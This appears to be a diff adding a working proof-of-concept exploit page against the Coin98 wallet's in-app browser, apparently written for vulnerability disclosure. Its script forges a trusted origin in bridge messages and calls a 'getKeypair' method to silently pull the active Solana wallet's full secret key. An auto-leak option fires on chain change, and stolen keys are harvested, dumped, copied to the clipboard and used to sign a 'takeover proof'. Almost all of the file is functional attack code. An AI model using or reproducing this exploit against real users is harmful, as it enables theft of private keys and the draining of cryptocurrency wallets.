@@ -1,0 +1,421 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <title>Coin98 Solana getKeypair Bridge - PoC</title>
+  <style>
+    body { background:#0b0b0b; color:#9cffbd; font-family:monospace; padding:14px; }
+    h3 { margin:6px 0; color:#fff; }
+    h4 { margin:18px 0 4px 0; color:#ffe08a; border-bottom:1px solid #333; padding-bottom:2px; }
+    button,input,select { background:#171717; color:#9cffbd; border:1px solid #333; padding:7px; margin:4px; font-family:monospace; }
+    input { width:520px; max-width:95%; }
+    button.crit { border-color:#ff5577; color:#ff8899; }
+    button.win  { border-color:#55ff77; color:#88ff99; }
+    button.high { border-color:#ffaa44; color:#ffcc77; }
+    pre { background:#141414; padding:12px; white-space:pre-wrap; font-size:12px; max-height:520px; overflow:auto; }
+    .row { display:flex; flex-wrap:wrap; gap:6px; align-items:center; }
+    .note { color:#888; font-size:11px; margin:2px 0 6px 4px; }
+    .state { background:#1a1a1a; padding:8px 10px; border:1px dashed #333; margin:6px 0; font-size:12px; color:#ffe08a; }
+    .state b { color:#fff; }
+    label { color:#ccc; }
+    .step { color:#9cffbd; opacity:0.7; font-size:11px; margin-left:4px; }
+  </style>
+</head>
+<body>
+  <h3>Coin98 Solana getKeypair Bridge - PoC</h3>
+  <div class="note">.</div>
+
+  <div class="state">
+    <b>State</b> &nbsp;
+    <span id="stChain">activeChain: ?</span> &nbsp;|&nbsp;
+    <span id="stAddr">address: ?</span> &nbsp;|&nbsp;
+    <span id="stLeaked">leaked: 0</span> &nbsp;|&nbsp;
+    <label><input type="checkbox" id="autoLeak"> auto-leak on chainChanged=solana</label> &nbsp;
+    <button onclick="dumpLeaks()">dump leaked</button>
+    <button onclick="copyLeaks()">copy leaked JSON</button>
+  </div>
+  <div id="leakBox" class="state" style="display:none"></div>
+
+  <div>
+    <label>Forged origin (sent in every bridge message):</label><br>
+    <input id="origin" value="https://www.coin98.com">
+  </div>
+
+  <h4>Step 1 — Recon <span class="step">(no modal, returns active Solana wallet info)</span></h4>
+  <div class="row">
+    <button onclick="solAccounts()">sol_accounts</button>
+    <button onclick="solHasWallet()">has_wallet</button>
+  </div>
+
+  <h4>Step 2 — Leak <span class="step">(silent, no permission, no modal — returns full Ed25519 keypair)</span></h4>
+  <div class="row">
+    <button class="win" onclick="leakKeypair()">getKeypair (LEAK)</button>
+  </div>
+
+  <h4>Step 3 — Verify leak <span class="step">(prove key really controls the leaked address, fully offline)</span></h4>
+  <div class="row">
+    <button class="win" onclick="decodeLeaked()">decode (b58 / hex)</button>
+    <button class="win" onclick="proveTakeover()">PROVE takeover (Ed25519 sign+verify)</button>
+  </div>
+
+  
+
+  <pre id="log"></pre>
+
+<script>
+// =========================
+// state
+// =========================
+const pending = new Map();
+const state = {
+  activeChain: null,
+  leakedKp: null,           // last leaked: {publicKey: Uint8Array, secretKey: Uint8Array}
+  leakHistory: {}           // address -> {secretKeyB58, secretKeyHex, ts}
+};
+let lastAutoLeakAt = 0;
+
+// =========================
+// dom helpers
+// =========================
+const $ = id => document.getElementById(id);
+const forgedOrigin = () => $("origin").value.trim();
+const getRpc = () => $("rpc").value;
+
+function log(...a) {
+  const el = $("log");
+  el.textContent += a.join(" ") + "\n";
+  el.scrollTop = el.scrollHeight;
+}
+function clearLog() { $("log").textContent = ""; }
+
+function refreshState() {
+  $("stChain").textContent = "activeChain: " + (state.activeChain || "?");
+  const n = Object.keys(state.leakHistory).length;
+  $("stLeaked").textContent = "leaked: " + n;
+  if (state.leakedKp && state.leakedKp.publicKey) {
+    const a = bs58encode(state.leakedKp.publicKey);
+    $("stAddr").textContent = "address: " + a.slice(0,6) + "..." + a.slice(-4);
+  }
+}
+
+function dumpLeaks() {
+  const box = $("leakBox");
+  const entries = Object.entries(state.leakHistory);
+  if (!entries.length) { box.style.display = "none"; box.textContent = ""; log("[leaks] none"); return; }
+  box.style.display = "block";
+  box.innerHTML = entries.map(([addr, v]) =>
+    `<b>addr</b>: ${addr}<br>` +
+    `&nbsp;&nbsp;sk-b58: ${v.secretKeyB58}<br>` +
+    `&nbsp;&nbsp;sk-hex: ${v.secretKeyHex}<br>` +
+    `&nbsp;&nbsp;seen:&nbsp;&nbsp; ${new Date(v.ts).toISOString()}`
+  ).join("<hr style='border-color:#333'>");
+  log("[leaks] " + entries.length + " key(s) dumped to panel above");
+}
+
+function copyLeaks() {
+  const out = JSON.stringify(state.leakHistory, null, 2);
+  if (navigator.clipboard && navigator.clipboard.writeText) {
+    navigator.clipboard.writeText(out).then(
+      () => log("[leaks] copied " + Object.keys(state.leakHistory).length + " key(s) to clipboard"),
+      e => log("[leaks copy err]", e.message || String(e))
+    );
+  } else {
+    log("[leaks JSON]\n" + out);
+  }
+}
+
+function recordLeak(pkBytes, skBytes) {
+  if (!pkBytes || !skBytes) return;
+  const addr = bs58encode(pkBytes);
+  if (state.leakHistory[addr]) return;
+  state.leakHistory[addr] = {
+    secretKeyB58: bs58encode(skBytes),
+    secretKeyHex: bytesToHex(skBytes),
+    ts: Date.now()
+  };
+  refreshState();
+  log("[harvest] new key recorded for", addr, "(total:", Object.keys(state.leakHistory).length + ")");
+}
+
+// =========================
+// utils
+// =========================
+function normalize(v) {
+  if (typeof v === "string") { try { return normalize(JSON.parse(v)); } catch { return v; } }
+  if (Array.isArray(v)) return v.map(normalize);
+  if (v && typeof v === "object") {
+    const out = {};
+    for (const k of Object.keys(v)) out[k] = normalize(v[k]);
+    return out;
+  }
+  return v;
+}
+
+function findKeypairDeep(v, depth = 0) {
+  if (!v || depth > 8) return null;
+  if (typeof v === "object") {
+    if (v.secretKey || (v._keypair && v._keypair.secretKey)) return v._keypair || v;
+    if (Array.isArray(v)) {
+      for (const x of v) { const k = findKeypairDeep(x, depth + 1); if (k) return k; }
+    } else {
+      for (const key of Object.keys(v)) {
+        const k = findKeypairDeep(v[key], depth + 1);
+        if (k) return k;
+      }
+    }
+  }
+  return null;
+}
+
+function indexedObjToBytes(b) {
+  if (!b) return null;
+  if (b instanceof Uint8Array) return b;
+  if (Array.isArray(b)) return new Uint8Array(b.map(Number));
+  if (typeof b === "object") {
+    const keys = Object.keys(b).filter(k => /^\d+$/.test(k)).sort((a, b) => +a - +b);
+    if (keys.length) return new Uint8Array(keys.map(k => Number(b[k])));
+  }
+  return null;
+}
+
+function bytesToHex(arr) {
+  const u = indexedObjToBytes(arr);
+  if (!u) return "";
+  return Array.from(u).map(x => x.toString(16).padStart(2, "0")).join("");
+}
+
+const BS58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
+function bs58encode(bytes) {
+  const u = indexedObjToBytes(bytes);
+  if (!u) return "";
+  let zeros = 0;
+  while (zeros < u.length && u[zeros] === 0) zeros++;
+  let n = 0n;
+  for (const b of u) n = (n << 8n) | BigInt(b);
+  let out = "";
+  while (n > 0n) {
+    const r = Number(n % 58n);
+    out = BS58[r] + out;
+    n = n / 58n;
+  }
+  return "1".repeat(zeros) + out;
+}
+
+function bs58decode(s) {
+  let n = 0n;
+  for (const c of s) {
+    const i = BS58.indexOf(c);
+    if (i < 0) throw new Error("bad bs58 char: " + c);
+    n = n * 58n + BigInt(i);
+  }
+  let zeros = 0;
+  for (const c of s) { if (c === "1") zeros++; else break; }
+  const bytes = [];
+  while (n > 0n) { bytes.unshift(Number(n & 0xffn)); n >>= 8n; }
+  while (bytes.length < zeros + 32) bytes.unshift(0);
+  return Uint8Array.from(bytes);
+}
+
+function concatU8(...a) {
+  const t = a.reduce((s, x) => s + x.length, 0);
+  const o = new Uint8Array(t);
+  let p = 0;
+  for (const x of a) { o.set(x, p); p += x.length; }
+  return o;
+}
+function compactU16(n) {
+  const out = [];
+  while (true) {
+    if (n < 0x80) { out.push(n); return Uint8Array.from(out); }
+    out.push((n & 0x7f) | 0x80);
+    n >>>= 7;
+  }
+}
+function u64le(n) {
+  const b = new Uint8Array(8);
+  let v = BigInt(n);
+  for (let i = 0; i < 8; i++) { b[i] = Number(v & 0xffn); v >>= 8n; }
+  return b;
+}
+
+function extractErr(data) {
+  const e = data?.payload?.error || data?.error;
+  if (!e) return null;
+  return { code: e.code, message: e.message, data: e.data };
+}
+
+// =========================
+// bridge to Coin98 native
+// =========================
+function bridge(id, method, params) {
+  const msg = { id, type: "solana", origin: forgedOrigin(), payload: { method, params } };
+  log("\n>>", JSON.stringify(msg, null, 2));
+  if (!window.ReactNativeWebView) {
+    log("[!] window.ReactNativeWebView not available. Open this PoC inside Coin98's in-app browser.");
+    return false;
+  }
+  window.ReactNativeWebView.postMessage(JSON.stringify(msg));
+  return true;
+}
+
+function waitResp(id, timeoutMs = 30000) {
+  return new Promise((resolve, reject) => {
+    const t = setTimeout(() => { pending.delete(id); reject(new Error("timeout: " + id)); }, timeoutMs);
+    pending.set(id, (data) => { clearTimeout(t); resolve(data); });
+  });
+}
+
+// =========================
+// inbound handler
+// =========================
+window.addEventListener("message", (ev) => {
+  const data = normalize(ev.data);
+  log("<<", JSON.stringify(data, null, 2));
+
+  // wallet broadcasts state changes
+  if (data && data.name && data.payload !== undefined) {
+    if (data.name === "chainChanged" || data.name === "legacy_chainId") {
+      const v = data.payload;
+      if (typeof v === "string") {
+        state.activeChain = v;
+        refreshState();
+        if (v === "solana" && $("autoLeak") && $("autoLeak").checked) {
+          const now = Date.now();
+          if (now - lastAutoLeakAt > 1500) {
+            lastAutoLeakAt = now;
+            log("[auto-leak] chainChanged=solana detected, firing getKeypair");
+            bridge("auto-" + now, "getKeypair", []);
+          }
+        }
+      }
+    }
+  }
+
+  // detect leaked keypair in any response
+  const kp = findKeypairDeep(data);
+  if (kp) {
+    log("[!!! KEYPAIR LEAKED !!!]");
+    const sk = indexedObjToBytes(kp.secretKey);
+    const pk = indexedObjToBytes(kp.publicKey);
+    if (sk) log("[secretKey hex]", bytesToHex(sk), "(" + sk.length + " bytes)");
+    if (pk) {
+      log("[publicKey hex]", bytesToHex(pk), "(" + pk.length + " bytes)");
+      log("[publicKey b58]", bs58encode(pk), " <-- Solana address");
+    }
+    if (sk && pk) {
+      state.leakedKp = { secretKey: sk, publicKey: pk };
+      recordLeak(pk, sk);
+    }
+  }
+
+  // capture errors
+  const err = extractErr(data);
+  if (err) log("[ERROR " + err.code + "]", err.message || JSON.stringify(err));
+
+  // resolve pending promise
+  const id =
+    data?.name ??
+    data?.id ??
+    data?.payload?.id ??
+    data?.result?.id;
+  if (id && pending.has(id)) {
+    pending.get(id)(data);
+    pending.delete(id);
+  }
+});
+
+// =========================
+// Step 1 — recon
+// =========================
+async function solAccounts() {
+  const id = "rec-acct-" + Date.now();
+  bridge(id, "sol_accounts", []);
+  await waitResp(id).catch(e => log("[wait]", e.message));
+}
+async function solHasWallet() {
+  const id = "rec-has-" + Date.now();
+  bridge(id, "has_wallet", []);
+  await waitResp(id).catch(e => log("[wait]", e.message));
+}
+
+// =========================
+// Step 2 — leak
+// =========================
+async function leakKeypair() {
+  if (state.activeChain && state.activeChain !== "solana") {
+    log("[warn] activeChain='" + state.activeChain + "'. getKeypair only returns active wallet's key. Switch to a Solana wallet in Coin98 first.");
+  }
+  const id = "leak-" + Date.now();
+  bridge(id, "getKeypair", []);
+  await waitResp(id, 60000).catch(e => log("[wait]", e.message));
+}
+
+// =========================
+// Step 3 — verify
+// =========================
+function decodeLeaked() {
+  if (!state.leakedKp) { log("[decode] no leaked key in memory; click Step 2 first"); return; }
+  const sk = state.leakedKp.secretKey;
+  const pk = state.leakedKp.publicKey;
+  log("[decode] pk hex   :", bytesToHex(pk));
+  log("[decode] pk b58   :", bs58encode(pk), " <-- Solana address");
+  log("[decode] sk hex   :", bytesToHex(sk), "(" + sk.length + " bytes)");
+  log("[decode] seed b58 :", bs58encode(sk.slice(0, 32)));
+  log("[decode] full sk b58:", bs58encode(sk));
+}
+
+async function proveTakeover() {
+  if (!state.leakedKp) { log("[proof] no leaked key; click Step 2 first"); return; }
+  const sk = state.leakedKp.secretKey;
+  const pk = state.leakedKp.publicKey;
+
+  log("\n=== TAKEOVER PROOF ===");
+
+  // structural
+  log("[1/2] Structural: Solana sk = [seed(32) | pubkey(32)]");
+  let structOk = sk.length === 64 && pk.length === 32;
+  for (let i = 0; structOk && i < 32; i++) if (sk[32 + i] !== pk[i]) structOk = false;
+  log("[1/2] sk[32..63] === publicKey :", structOk ? "MATCH" : "MISMATCH");
+  if (!structOk) return;
+
+  if (!(crypto && crypto.subtle && crypto.subtle.importKey)) {
+    log("[2/2] WebCrypto unavailable. Structural proof alone is sufficient: standard Ed25519 = possessing seed = signing authority.");
+    return;
+  }
+
+  try {
+    const seed = sk.slice(0, 32);
+    const pkcs8Hdr = new Uint8Array([0x30,0x2e,0x02,0x01,0x00,0x30,0x05,0x06,0x03,0x2b,0x65,0x70,0x04,0x22,0x04,0x20]);
+    const pkcs8 = concatU8(pkcs8Hdr, seed);
+    const privKey = await crypto.subtle.importKey("pkcs8", pkcs8, { name: "Ed25519" }, false, ["sign"]);
+    const pubKey  = await crypto.subtle.importKey("raw",   pk,    { name: "Ed25519" }, false, ["verify"]);
+
+    const msgText = "TAKEOVER PROOF for " + bs58encode(pk) + " at " + new Date().toISOString();
+    const msg = new TextEncoder().encode(msgText);
+    const sigBuf = await crypto.subtle.sign({ name: "Ed25519" }, privKey, msg);
+    const valid  = await crypto.subtle.verify({ name: "Ed25519" }, pubKey, sigBuf, msg);
+
+    log("[2/2] message  :", msgText);
+    log("[2/2] signature:", bytesToHex(new Uint8Array(sigBuf)));
+    log("[2/2] verify   :", valid ? "VALID" : "INVALID");
+    log("");
+    if (valid) {
+      log("=== nice catch!! ===");
+   
+    }
+  } catch (e) {
+    log("[2/2] WebCrypto Ed25519 not supported here:", e.message || String(e));
+    log("[2/2] Workaround: import the b58 secret key into Phantom and confirm address matches.");
+  }
+}
+
+// =========================
+// boot
+// =========================
+log("[*] loaded");
+log("[*] ReactNativeWebView:", !!window.ReactNativeWebView);
+log("[*] forgedOrigin:", forgedOrigin());
+refreshState();
+</script>
+</body>
+</html>
